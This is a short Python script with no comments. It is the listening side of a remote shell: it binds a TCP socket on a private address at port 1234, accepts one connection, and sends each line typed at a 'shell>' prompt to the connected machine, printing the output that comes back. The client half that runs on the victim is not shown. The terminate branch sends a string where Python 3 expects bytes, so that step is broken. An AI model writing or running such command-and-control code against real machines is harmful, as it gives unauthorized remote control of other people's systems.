import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("192.168.1.36",1234))
s.listen()
conn, addr = s.accept()
while True:
    command = input("shell> ") 
    if 'terminate' in command: 
        conn.send('terminate')
        conn.close()
        break
    else:
        conn.send(command.encode("utf-8")) 
        print((conn.recv(1024)).decode("utf-8"))

